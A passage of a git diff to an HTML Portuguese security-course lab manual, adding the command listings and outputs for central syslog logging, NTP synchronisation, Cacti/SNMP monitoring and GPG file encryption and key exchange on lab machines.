+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code class="language-bash" data-lang="bash">destination d_rserver { udp("172.16.1.10" port(514)); };
+log { source(s_src); destination(d_rserver); };</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Finalmente, basta reiniciar o <code>syslog-ng</code>:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># systemctl restart syslog-ng.service</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Usando o comando <code>logger</code>, teste seu ambiente.</p>
+<div class="paragraph">
+<p>Na máquina <em>FWGW1-G</em>, crie um evento de log qualquer usando o comando <code>logger</code>:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># hostname
+FWGW1-A
+
+# logger -p error Teste</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Observando a máquina <em>LinServer-G</em>, perceba que foi criado um novo arquivo <code>/var/log/172.16.G.1.log</code>. Verificando seu conteúdo, é possível constatar que, de fato, os logs remotos do <em>host</em> <em>FWGW1-G</em> estão sendo enviados para cá.</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># hostname
+LinServer-A
+
+# tail -n1 /var/log/172.16.1.1.log
+Aug 26 06:49:30 172.16.1.1 aluno: Teste</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Agora, vamos configurar a máquina <em>WinServer-G</em> para enviar registros de eventos para o concentrador Syslog. Faça login como usuário <code>Administrator</code> e abra o <em>Group Policy Editor</em> digitando <code>gpedit.msc</code> no menu <em>Start</em> &gt; <em>Run&#8230;&#8203;</em>.</p>
@@ -3247,6 +4259,15 @@ FWGW1-A
 </tr>
 </tbody>
 </table>
+<div class="paragraph">
+<p>A tela ficaria, portanto, desta forma:</p>
+</div>
+<div id="img-syslog-gpedit" class="imageblock" style="text-align: center">
+<div class="content">
+<img src="./img/syslog-gpedit.png" alt="syslog gpedit">
+</div>
+<div class="title">Figure 46. Tela de políticas de auditoria para o WinServer-G</div>
+</div>
 </li>
 <li>
 <p>O próximo passo é instalar o Snare, que permitirá envio dos registros de eventos do Windows para um servidor Syslog remoto. Faça o download em <a href="https://www.snaresolutions.com/products/snare-agents/open-source-agents/" class="bare">https://www.snaresolutions.com/products/snare-agents/open-source-agents/</a> ; será necessário cadastrar seu nome/email para receber o link de download. Alternativamente, solicite o instalador ao instrutor.</p>
@@ -3287,7 +4308,7 @@ FWGW1-A
 <div class="content">
 <img src="./img/syslog-snare-start.png" alt="syslog snare start">
 </div>
-<div class="title">Figure 36. Inicialização do Snare</div>
+<div class="title">Figure 47. Inicialização do Snare</div>
 </div>
 <div class="paragraph">
 <p>Irá ser lançada uma janela do navegador. Informe o usuário <code>snare</code>, e senha <code>rnpesr</code>, como se segue:</p>
@@ -3296,7 +4317,7 @@ FWGW1-A
 <div class="content">
 <img src="./img/syslog-snare-password.png" alt="syslog snare password">
 </div>
-<div class="title">Figure 37. Login no Snare</div>
+<div class="title">Figure 48. Login no Snare</div>
 </div>
 <div class="paragraph">
 <p>Clique em <em>Network Configuration</em>&#8201;&#8212;&#8201;informe o IP da máquina <em>LinServer-G</em> no campo <em>Destination Snare Server address</em>, e a porta 514 no campo <em>Destination Port</em>, como se segue. Em seguida, clique em <em>Change Configuration</em>.</p>
@@ -3305,7 +4326,7 @@ FWGW1-A
 <div class="content">
 <img src="./img/syslog-snare-config.png" alt="syslog snare config">
 </div>
-<div class="title">Figure 38. Configurações do Snare</div>
+<div class="title">Figure 49. Configurações do Snare</div>
 </div>
 <div class="paragraph">
 <p>Em seguida, clique em <em>Apply the Latest Audit Configuration</em> e depois em <em>Reload Settings</em>.</p>
@@ -3313,6 +4334,15 @@ FWGW1-A
 </li>
 <li>
 <p>Faça logoff/logon no <em>WinServer-G</em> para gerar registros de eventos. Em seguida, volte à máquina <em>LinServer-G</em> e verifique que os logs estão de fato sendo enviados.</p>
+<div class="literalblock">
+<div class="content">
+<pre># hostname
+LinServer-A
+
+# grep Logoff /var/log/172.16.1.20.log
+Aug 26 07:10:25 172.16.1.20 WinServer-A MSWinEventLog   1       Security        50      dom ago 26 08:10:23 2018  4647    Microsoft-Windows-Security-Auditing     WINSERVER-A\Administrator       N/A     Success Audit     WinServer-A     Logoff          User initiated logoff:    Subject:   Security ID:  S-1-5-21-1959434341-4039883546-812769935-500   Account Name:  Administrator   Account Domain:  WINSERVER-A   Logon ID:  0x16898    This event is generated when a logoff is initiated but the token reference count is not zero and the logon session cannot be destroyed.  No further user-initiated activity can occur.  This event can be interpreted as a logoff event.  41</pre>
+</div>
+</div>
 </li>
 </ol>
 </div>
@@ -3340,18 +4370,128 @@ FWGW1-A
 <ol class="arabic">
 <li>
 <p>Primeiro, vamos configurar o servidor de hora. Acesse a máquina <em>LinServer-G</em> e instale o pacote <code>ntp</code>.</p>
+<div class="literalblock">
+<div class="content">
+<pre># hostname
+LinServer-A</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># apt-get install --no-install-recommends ntp</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Edite o arquivo <code>/etc/ntp.conf</code> e substitua o conteúdo das linhas 20-23 (que começam com a palavra-chave <code>pool</code>) pelas que se seguem. Comente ou remova as linhas originais.</p>
+<div class="literalblock">
+<div class="content">
+<pre># nano /etc/ntp.conf
+(...)</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># grep '^server' /etc/ntp.conf
+server a.ntp.br iburst
+server b.ntp.br iburst
+server c.ntp.br iburst</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Para sincronizar o relógio de forma imediata, pare o serviço do <code>ntp</code>, rode o comando <code>ntpd -gq</code> e em seguida inicie o <em>daemon</em>. Verifique se a hora está corrigida.</p>
+<div class="literalblock">
+<div class="content">
+<pre># systemctl stop ntp</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># ntpd -gq
+ntpd: time slew +0.000090s</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># date
+qui out 11 15:25:50 -03 2018</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># systemctl start ntp</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Cheque se o <code>ntp</code> está funcionando, e se está escutando por conexões de rede na porta esperada. A seguir, iremos configurar os clientes NTP.</p>
+<div class="literalblock">
+<div class="content">
+<pre># ntpq -c pe
+     remote           refid      st t when poll reach   delay   offset  jitter
+==============================================================================
+*a.ntp.br        200.160.7.186    2 u   48   64   77   16.623   -0.352   0.229
+ b.ntp.br        200.160.7.186    2 u   51   64   77   57.992   -1.086   0.239
+ c.ntp.br        200.160.7.186    2 u   50   64   77   40.497   -2.432   0.281</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># netstat -unlp | grep '^udp .*:123'
+udp        0      0 172.16.1.10:123         0.0.0.0:*                           11052/ntpd
+udp        0      0 127.0.0.1:123           0.0.0.0:*                           11052/ntpd
+udp        0      0 0.0.0.0:123             0.0.0.0:*                           11052/ntpd</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Vamos configurar o cliente NTP Linux, na máquina <em>FWGW1-G</em>. Instale o pacote <code>ntp</code>; edite o arquivo <code>/etc/ntp.conf</code> para consultar o servidor de hora <em>LinServer-G</em>; pare o serviço <code>ntp</code>, sincronize a hora imediatamente e reinicie-o.</p>
+<div class="literalblock">
+<div class="content">
+<pre># hostname
+FWGW1-A</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># apt-get install --no-install-recommends ntp</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># nano /etc/ntp.conf
+(...)</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># grep '^server' /etc/ntp.conf
+server 172.16.1.10 iburst</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># systemctl stop ntp</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># ntpd -gq
+ntpd: time slew -0.000270s</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># date
+qui out 11 15:28:12 -03 2018</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># systemctl start ntp</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Finalmente, configure o cliente NTP na máquina <em>WinServer-G</em>. O Microsoft Windows possui uma forma simples de configurar o sincronismo de relógio com servidores de rede, desde de que não tenham o servidor de diretório <em>Microsoft Active Directory</em> como controlador de domínio, pois dessa forma o sincronismo é automático.</p>
@@ -3362,7 +4502,7 @@ FWGW1-A
 <div class="content">
 <img src="./img/ntp-win-internettime.png" alt="ntp win internettime">
 </div>
-<div class="title">Figure 39. Aba Internet Time do relógio do Windows</div>
+<div class="title">Figure 50. Aba Internet Time do relógio do Windows</div>
 </div>
 <div class="paragraph">
 <p>Clique em <em>Change Settings&#8230;&#8203;</em>, e informe o IP da máquina <em>LinServer-G</em> no campo <em>Server</em>. Em seguida, clique em <em>Update now</em> (se ocorrer um erro, clique uma segunda vez), e o relógio do sistema deverá ser atualizado.</p>
@@ -3371,7 +4511,7 @@ FWGW1-A
 <div class="content">
 <img src="./img/ntp-win-setserver.png" alt="ntp win setserver">
 </div>
-<div class="title">Figure 40. Modificando o servidor NTP do Windows</div>
+<div class="title">Figure 51. Modificando o servidor NTP do Windows</div>
 </div>
 </li>
 </ol>
@@ -3414,6 +4554,18 @@ FWGW1-A
 </div>
 </div>
 </div>
+<div class="literalblock">
+<div class="content">
+<pre># hostname
+LinServer-A</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># apt-get install cacti
+(...)</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Em sua máquina física, acesse a URL <code><a href="http://172.16.1.10/cacti" class="bare">http://172.16.1.10/cacti</a></code> para acessar a console administrativa do Cacti. Entre com o usuário <code>admin</code> e senha <code>rnpesr123</code>.</p>
@@ -3421,17 +4573,62 @@ FWGW1-A
 <div class="content">
 <img src="./img/cacti-console.png" alt="cacti console">
 </div>
-<div class="title">Figure 41. Console do Cacti</div>
+<div class="title">Figure 52. Console do Cacti</div>
 </div>
 </li>
 <li>
 <p>Vamos instalar o agente SNMP na máquina <em>FWGW1-G</em>. Instale o pacote <code>snmpd</code>.</p>
+<div class="literalblock">
+<div class="content">
+<pre># hostname
+FWGW1-A</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># apt-get install --no-install-recommends snmpd</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Edite o arquivo <code>/etc/snmp/snmpd.conf</code>, comente a linha <code>agentAddress  udp:127.0.0.1:161</code> e descomente a linha <code>agentAddress udp:161,udp6:[::1]:161</code>. Em seguida, reinicie o <code>snmpd</code> e verifique que ele está escutando na porta apropriada.</p>
+<div class="literalblock">
+<div class="content">
+<pre># vi /etc/snmp/snmpd.conf
+(...)</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># grep '^#*agentAddress' /etc/snmp/snmpd.conf
+#agentAddress  udp:127.0.0.1:161
+agentAddress udp:161,udp6:[::1]:161</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># systemctl restart snmpd</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># netstat -unlp | grep '^udp .*:161'
+udp        0      0 0.0.0.0:161             0.0.0.0:*                           12527/snmpd</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Lembre-se que a <em>chain</em> INPUT da tabela <em>filter</em> do firewall <em>FWGW1-G</em> não está configurada para permitir conexões nessa porta. Corrija o problema e salve as modificações no arquivo <code>/etc/iptables/rules.v4</code>.</p>
+<div class="literalblock">
+<div class="content">
+<pre># iptables -A INPUT -s 172.16.1.10/32 -p udp -m udp --dport 161 -m state --state NEW,ESTABLISHED -j ACCEPT</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># iptables-save &gt; /etc/iptables/rules.v4</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Agora, vamos instalar o agente SNMP na máquina <em>WinServer-G</em>. Acesse como usuário <em>Administrator</em> e, dentro do <em>Server Manager</em>, clique com o botão direito em <em>Features</em> &gt; <em>Add Features</em>. Desça a barra de rolagem, selecione a caixa <em>SNMP Services</em> e prossiga com o assistente.</p>
@@ -3439,7 +4636,7 @@ FWGW1-A
 <div class="content">
 <img src="./img/snmp-wininstall.png" alt="snmp wininstall">
 </div>
-<div class="title">Figure 42. Instalação da feature SNMP</div>
+<div class="title">Figure 53. Instalação da feature SNMP</div>
 </div>
 </li>
 <li>
@@ -3448,7 +4645,7 @@ FWGW1-A
 <div class="content">
 <img src="./img/snmp-winprop.png" alt="snmp winprop">
 </div>
-<div class="title">Figure 43. Propriedades do serviço SNMP</div>
+<div class="title">Figure 54. Propriedades do serviço SNMP</div>
 </div>
 <div class="paragraph">
 <p>Na aba <em>Security</em>, caixa <em>Accepted community names</em>, clique em <em>Add&#8230;&#8203;</em> e adicione a comunidade <code>public</code> com permissões <em>READ ONLY</em>. Logo abaixo, na caixa <em>Accept SNMP packets from these hosts</em>, clique em <em>Add&#8230;&#8203;</em> e adicione o IP da máquina <em>LinServer-G</em>. Sua janela deverá ficar assim:</p>
@@ -3457,7 +4654,7 @@ FWGW1-A
 <div class="content">
 <img src="./img/snmp-winconfig.png" alt="snmp winconfig">
 </div>
-<div class="title">Figure 44. Configurações do serviço SNMP</div>
+<div class="title">Figure 55. Configurações do serviço SNMP</div>
 </div>
 <div class="paragraph">
 <p>Finalmente, clique com o botão direito no serviço <em>SNMP Service</em> e em seguida em <em>Restart</em>.</p>
@@ -3469,7 +4666,7 @@ FWGW1-A
 <div class="content">
 <img src="./img/cacti-adddevice.png" alt="cacti adddevice">
 </div>
-<div class="title">Figure 45. Adicionando device no Cacti, parte 1</div>
+<div class="title">Figure 56. Adicionando device no Cacti, parte 1</div>
 </div>
 <div class="paragraph">
 <p>Na nova janela, informe o nome da máquina <em>FWGW1-G</em> no campo <em>Description</em>, seu IP exposto à DMZ no campo <em>Hostname</em>, e escolha a opção <em>Local Linux Machine</em> no campo <em>Host Template</em>. Verifique se sua janela está como se segue, e clique em <em>Create</em>.</p>
@@ -3478,7 +4675,7 @@ FWGW1-A
 <div class="content">
 <img src="./img/cacti-adddevice2.png" alt="cacti adddevice2">
 </div>
-<div class="title">Figure 46. Adicionando device no Cacti, parte 2</div>
+<div class="title">Figure 57. Adicionando device no Cacti, parte 2</div>
 </div>
 <div class="paragraph">
 <p>Verifique que as informações SNMP do <em>host</em> <em>FWGW1-G</em> figuram corretamente na seção <em>SNMP Information</em> no topo da tela. Em seguida, clique em <em>Create Graphs for this Host</em>.</p>
@@ -3487,7 +4684,7 @@ FWGW1-A
 <div class="content">
 <img src="./img/cacti-cgraphs.png" alt="cacti cgraphs">
 </div>
-<div class="title">Figure 47. Adicionando gráficos no Cacti, parte 1</div>
+<div class="title">Figure 58. Adicionando gráficos no Cacti, parte 1</div>
 </div>
 <div class="paragraph">
 <p>Na nova janela, selecione todos os <em>Graph Templates</em> e <em>Data Queries</em> disponíveis e clique em <em>Create</em>. Na janela que se segue, clique novamente em <em>Create</em>.</p>
@@ -3496,7 +4693,7 @@ FWGW1-A
 <div class="content">
 <img src="./img/cacti-cgraphs2.png" alt="cacti cgraphs2">
 </div>
-<div class="title">Figure 48. Adicionando gráficos no Cacti, parte 2</div>
+<div class="title">Figure 59. Adicionando gráficos no Cacti, parte 2</div>
 </div>
 <div class="paragraph">
 <p>Agora, o passo final é adicionar os gráficos a uma árvore de gráficos. No menu à esquerda, clique em <em>Graph Trees</em>, e em seguida em <em>Default Tree</em>.</p>
@@ -3505,7 +4702,7 @@ FWGW1-A
 <div class="content">
 <img src="./img/cacti-addtree.png" alt="cacti addtree">
 </div>
-<div class="title">Figure 49. Adicionando gráficos a árvores no Cacti, parte 1</div>
+<div class="title">Figure 60. Adicionando gráficos a árvores no Cacti, parte 1</div>
 </div>
 <div class="paragraph">
 <p>Na nova janela, em <em>Tree Items</em>, clique em <em>Add</em>.</p>
@@ -3514,7 +4711,7 @@ FWGW1-A
 <div class="content">
 <img src="./img/cacti-addtree2.png" alt="cacti addtree2">
 </div>
-<div class="title">Figure 50. Adicionando gráficos a árvores no Cacti, parte 2</div>
+<div class="title">Figure 61. Adicionando gráficos a árvores no Cacti, parte 2</div>
 </div>
 <div class="paragraph">
 <p>Na nova janela, em <em>Tree Item Type</em>, altere o valor para <em>Host</em>. Novas opções irão surgir. Em <em>Host</em>, selecione a máquina <em>FWGW1-G</em>, e depois clique em <em>Create</em>.</p>
@@ -3523,7 +4720,7 @@ FWGW1-A
 <div class="content">
 <img src="./img/cacti-addtree3.png" alt="cacti addtree3">
 </div>
-<div class="title">Figure 51. Adicionando gráficos a árvores no Cacti, parte 3</div>
+<div class="title">Figure 62. Adicionando gráficos a árvores no Cacti, parte 3</div>
 </div>
 <div class="paragraph">
 <p>Para visualizar os gráficos recém-criados, no menu superior acesse <em>graphs</em>, expanda a <em>Default Tree</em> e clique no <em>host</em> <em>FWGW1-G</em>. Pode demorar algum tempo para que os gráficos sejam populados.</p>
@@ -3532,7 +4729,7 @@ FWGW1-A
 <div class="content">
 <img src="./img/cacti-viewgraph.png" alt="cacti viewgraph">
 </div>
-<div class="title">Figure 52. Visualizando gráficos no Cacti, máquina <em>FWGW1-G</em></div>
+<div class="title">Figure 63. Visualizando gráficos no Cacti, máquina <em>FWGW1-G</em></div>
 </div>
 </li>
 <li>
@@ -3541,7 +4738,7 @@ FWGW1-A
 <div class="content">
 <img src="./img/cacti-viewgraph2.png" alt="cacti viewgraph2">
 </div>
-<div class="title">Figure 53. Visualizando gráficos no Cacti, máquina <em>WinServer-G</em></div>
+<div class="title">Figure 64. Visualizando gráficos no Cacti, máquina <em>WinServer-G</em></div>
 </div>
 </li>
 </ol>
@@ -4433,7 +5630,7 @@ out 15 16:25:53 FWGW1-A barnyard2[3739]: Waiting for new data</pre>
 <div class="content">
 <img src="./img/snorby1.png" alt="snorby1">
 </div>
-<div class="title">Figure 54. Dashboard do Snorby</div>
+<div class="title">Figure 65. Dashboard do Snorby</div>
 </div>
 </li>
 </ol>
@@ -4514,7 +5711,7 @@ iface eth0 inet dhcp</pre>
 <div class="content">
 <img src="./img/snorby2.png" alt="snorby2">
 </div>
-<div class="title">Figure 55. Listagem de eventos no Snorby</div>
+<div class="title">Figure 66. Listagem de eventos no Snorby</div>
 </div>
 </li>
 <li>
@@ -4523,7 +5720,7 @@ iface eth0 inet dhcp</pre>
 <div class="content">
 <img src="./img/snorby3.png" alt="snorby3">
 </div>
-<div class="title">Figure 56. Listagem de eventos no Snorby</div>
+<div class="title">Figure 67. Listagem de eventos no Snorby</div>
 </div>
 </li>
 <li>
@@ -4584,12 +5781,72 @@ iface eth0 inet dhcp</pre>
 <ol class="arabic">
 <li>
 <p>Na máquina <em>FWGW1-G</em>, descubra quais cifras simétricas são suportadas pelo programa <code>gpg</code> (<em>GNU Privacy Guard</em>).</p>
+<div class="literalblock">
+<div class="content">
+<pre>$ hostname
+FWGW1-A</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ gpg --version | grep Cipher -A1
+Cipher: IDEA, 3DES, CAST5, BLOWFISH, AES, AES192, AES256, TWOFISH,
+        CAMELLIA128, CAMELLIA192, CAMELLIA256</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Crie um arquivo <code>teste.txt</code> com qualquer conteúdo. Criptografe-o usando a cifra simétrica AES256, com senha <code>rnpesr</code>. Em seguida, copie o arquivo cifrado resultante para o diretório <em>home</em> do usuário <code>aluno</code>, na máquina <em>LinServer-G</em>, usando o comando <code>scp</code>.</p>
+<div class="literalblock">
+<div class="content">
+<pre>$ echo 'teste de cifragem' &gt; teste.txt</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ gpg --symmetric --cipher-algo AES256 teste.txt</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ ls teste.txt*
+teste.txt  teste.txt.gpg</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ scp teste.txt.gpg aluno@172.16.1.10:~
+teste.txt.gpg                                                           100%   94     0.1KB/s   00:00</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Na máquina <em>LinServer-G</em>, tente descriptografar o arquivo copiado. Seu conteúdo permanece o mesmo?</p>
+<div class="literalblock">
+<div class="content">
+<pre>$ hostname
+LinServer-A</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ ls teste.txt*
+teste.txt.gpg</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ gpg -o teste.txt.out -d teste.txt.gpg
+gpg: AES256 encrypted data
+gpg: encrypted with 1 passphrase</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ cat teste.txt.out
+teste de cifragem</pre>
+</div>
+</div>
 </li>
 </ol>
 </div>
@@ -4614,33 +5871,554 @@ iface eth0 inet dhcp</pre>
 <ol class="arabic">
 <li>
 <p>Na máquina <em>FWGW1-G</em>, como usuário <code>root</code>, instale o pacote <code>rng-tools</code> e rode o comando <code>rngd -r /dev/urandom</code>:</p>
+<div class="literalblock">
+<div class="content">
+<pre># hostname ; whoami
+FWGW1-A
+root</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># apt-get install rng-tools</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># rngd -r /dev/urandom</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Agora, como usuário <code>aluno</code>, descubra quais cifras assimétricas são suportadas pelo programa <code>gpg</code> (<em>GNU Privacy Guard</em>).</p>
+<div class="literalblock">
+<div class="content">
+<pre>$ hostname ; whoami ; pwd
+FWGW1-A
+aluno
+/home/aluno</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ gpg --version | grep Pubkey
+Pubkey: RSA, ELG, DSA, ECDH, ECDSA, EDDSA</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Vamos fazer um exercício de criptografia usando chaves assimétricas entre dois usuários fictícios, Alice (operando na máquina <em>FWGW1-G</em>) e Bobby (operando na máquina <em>LinServer-G</em>). Vamos começar por Alice&#8201;&#8212;&#8201;gere um par de chaves assimétricas RSA padrão, com 4096 bits e sem data de expiração para ela, usando o programa <code>gpg</code> com a opção <code>--full-generate-key</code>. O e-mail de Alice será <a href="mailto:alice@seg12.esr.rnp.br">alice@seg12.esr.rnp.br</a> , e a senha de acesso à chave será <code>rnpesr123</code>.</p>
+<div class="literalblock">
+<div class="content">
+<pre>$ gpg --full-generate-key</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>gpg (GnuPG) 2.1.18; Copyright (C) 2017 Free Software Foundation, Inc.
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+
+Please select what kind of key you want:
+   (1) RSA and RSA (default)
+   (2) DSA and Elgamal
+   (3) DSA (sign only)
+   (4) RSA (sign only)
+Your selection? 1
+RSA keys may be between 1024 and 4096 bits long.
+What keysize do you want? (2048) 4096
+Requested keysize is 4096 bits
+Please specify how long the key should be valid.
+         0 = key does not expire
+      &lt;n&gt;  = key expires in n days
+      &lt;n&gt;w = key expires in n weeks
+      &lt;n&gt;m = key expires in n months
+      &lt;n&gt;y = key expires in n years
+Key is valid for? (0) 0
+Key does not expire at all
+Is this correct? (y/N) y
+
+GnuPG needs to construct a user ID to identify your key.
+
+Real name: Alice
+Email address: alice@seg12.esr.rnp.br
+Comment:
+You selected this USER-ID:
+    "Alice &lt;alice@seg12.esr.rnp.br&gt;"
+
+Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? O
+
+(...)
+
+gpg: key EB757978FB898C57 marked as ultimately trusted
+gpg: revocation certificate stored as '/home/aluno/.gnupg/openpgp-revocs.d/5A62CAF74E46B70509335DA7EB757978FB898C57.rev'
+public and secret key created and signed.
+
+pub   rsa4096 2018-10-16 [SC]
+      5A62CAF74E46B70509335DA7EB757978FB898C57
+      5A62CAF74E46B70509335DA7EB757978FB898C57
+uid                      Alice &lt;alice@seg12.esr.rnp.br&gt;
+sub   rsa4096 2018-10-16 [E]</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Na máquina <em>LinServer-G</em>, como usuário <code>root</code>, instale o pacote <code>rng-tools</code> e rode o comando <code>rngd -r /dev/urandom</code>:</p>
+<div class="literalblock">
+<div class="content">
+<pre># hostname ; whoami
+LinServer-A
+root</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># apt-get install rng-tools</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># rngd -r /dev/urandom</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Como usuário <code>aluno</code>, gere a chave de Bobby na máquina <em>LinServer-G</em>. Repita o procedimento do passo (2), alterando o nome de usuário para Bobby e o email para <a href="mailto:bobby@seg12.esr.rnp.br">bobby@seg12.esr.rnp.br</a> .</p>
+<div class="literalblock">
+<div class="content">
+<pre>$ hostname ; whoami ; pwd
+LinServer-A
+aluno
+/home/aluno</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ gpg --full-generate-key
+(...)</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>gpg: key 6F4EC30E8E0D7290 marked as ultimately trusted
+gpg: revocation certificate stored as '/home/aluno/.gnupg/openpgp-revocs.d/89AD21B9914F4E7E91AA89D06F4EC30E8E0D7290.rev'
+public and secret key created and signed.
+
+pub   rsa4096 2018-10-16 [SC]
+      89AD21B9914F4E7E91AA89D06F4EC30E8E0D7290
+      89AD21B9914F4E7E91AA89D06F4EC30E8E0D7290
+uid                      Bobby &lt;bobby@seg12.esr.rnp.br&gt;
+sub   rsa4096 2018-10-16 [E]</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Temos que exportar as chaves públicas de ambos os usuários, copiá-las para a máquina remota, e importá-las. Comece pela chave de Alice, exportando-a em formato <em>ASCII armored</em>; em seguida, copie-a para a máquina <em>LinServer-G</em> usando o <code>scp</code>, importe-a usando <code>gpg --import</code> e assine a chave.</p>
+<div class="paragraph">
+<p>Na máquina <em>FWGW1-G</em>, execute:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ hostname
+FWGW1-A</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ gpg --armor --export Alice &gt; alice_public.asc</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ scp alice_public.asc aluno@172.16.1.10:~
+alice_public.asc                                                        100% 3083     3.0KB/s   00:00</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Agora, na máquina <em>LinServer-G</em>, execute:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ hostname
+LinServer-A</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ gpg --import alice_public.asc
+gpg: key EB757978FB898C57: public key "Alice &lt;alice@seg12.esr.rnp.br&gt;" imported
+gpg: Total number processed: 1
+gpg:               imported: 1</pre>
+</div>
+</div>
+<div class="paragraph">
+<p><strong>Valide</strong> a chave recebida com o remetente (por exemplo, verficando que o <em>fingerprint</em> está de fato correto), e posteriormente assine-a como mostrado a seguir.</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ gpg --edit-key Alice
+gpg (GnuPG) 2.1.18; Copyright (C) 2017 Free Software Foundation, Inc.
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+
+
+gpg: checking the trustdb
+gpg: marginals needed: 3  completes needed: 1  trust model: pgp
+gpg: depth: 0  valid:   1  signed:   0  trust: 0-, 0q, 0n, 0m, 0f, 1u
+pub  rsa4096/EB757978FB898C57
+     created: 2018-10-16  expires: never       usage: SC
+     trust: unknown       validity: unknown
+sub  rsa4096/CDDA806670DAA306
+     created: 2018-10-16  expires: never       usage: E
+[ unknown] (1). Alice &lt;alice@seg12.esr.rnp.br&gt;</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>gpg&gt; fpr
+pub   rsa4096/EB757978FB898C57 2018-10-16 Alice &lt;alice@seg12.esr.rnp.br&gt;
+ Primary key fingerprint: 5A62 CAF7 4E46 B705 0933  5DA7 EB75 7978 FB89 8C57</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>gpg&gt; sign
+
+pub  rsa4096/EB757978FB898C57
+     created: 2018-10-16  expires: never       usage: SC
+     trust: unknown       validity: unknown
+ Primary key fingerprint: 5A62 CAF7 4E46 B705 0933  5DA7 EB75 7978 FB89 8C57
+
+     Alice &lt;alice@seg12.esr.rnp.br&gt;
+
+Are you sure that you want to sign this key with your
+key "Bobby &lt;bobby@seg12.esr.rnp.br&gt;" (6F4EC30E8E0D7290)
+
+Really sign? (y/N) y</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>gpg&gt; quit
+Save changes? (y/N) y</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Faça o procedimento reverso, exportando/copiando/importando e assinando a chave de Bobby na máquina de Alice. Lembre-se que o <code>ssh</code> para a máquina <em>FWGW1-G</em> é permitido apenas a partir da Intranet, então pode ser mais interessante iniciar o procedimento de cópia a partir do firewall, e não da máquina <em>LinServer-G</em>.</p>
+<div class="paragraph">
+<p>Primeiro, na máquina <em>LinServer-G</em>, vamos exportar a chave:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ hostname
+LinServer-A</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ gpg --armor --export Bobby &gt; bobby_public.asc</pre>
+</div>
+</div>
